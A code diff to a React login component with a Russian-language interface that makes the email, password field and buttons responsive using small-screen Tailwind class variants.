@@ -220,13 +220,13 @@ const Login = () => {
             </div>
           ) : (
             <>
-              <h1 className="text-5xl font-normal text-foreground mb-8">Добро пожаловать!</h1>
-              
-              <div className="flex items-center gap-3 mb-10">
-                <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center">
+              <h1 className="text-3xl sm:text-5xl font-normal text-foreground mb-4 sm:mb-8">Добро пожаловать!</h1>
+
+              <div className="flex items-center gap-3 mb-6 sm:mb-10 max-w-full">
+                <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-muted flex items-center justify-center shrink-0">
                   <svg
-                    width="24"
-                    height="24"
+                    width="22"
+                    height="22"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="currentColor"
@@ -237,10 +237,10 @@ const Login = () => {
                     <circle cx="12" cy="7" r="4" />
                   </svg>
                 </div>
-                <div className="text-foreground">{email}</div>
+                <div className="text-foreground text-sm sm:text-base truncate">{email}</div>
               </div>
 
-              <form onSubmit={handleSubmit} className="space-y-6">
+              <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
                 <div>
                   <label className="text-sm text-primary mb-2 block">
                     Введите пароль
@@ -249,7 +249,7 @@ const Login = () => {
                     type={showPassword ? "text" : "password"}
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
-                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
+                    className="w-full h-12 sm:h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                   />
                 </div>
 
@@ -266,24 +266,25 @@ const Login = () => {
                   </label>
                 </div>
 
-                <div className="flex justify-between items-center pt-8">
+                <div className="flex flex-wrap justify-between items-center gap-3 pt-4 sm:pt-8">
                   <Button
                     type="button"
                     variant="ghost"
                     onClick={() => setStep("email")}
-                    className="text-primary hover:bg-secondary hover:text-primary"
+                    className="text-primary hover:bg-secondary hover:text-primary px-3 sm:px-4"
                   >
                     Другой способ
                   </Button>
-                  
+
                   <Button
                     type="submit"
-                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
+                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-6 sm:px-8 rounded-full"
                   >
                     Далее
                   </Button>
                 </div>
               </form>
+
             </>
           )}
         </div>
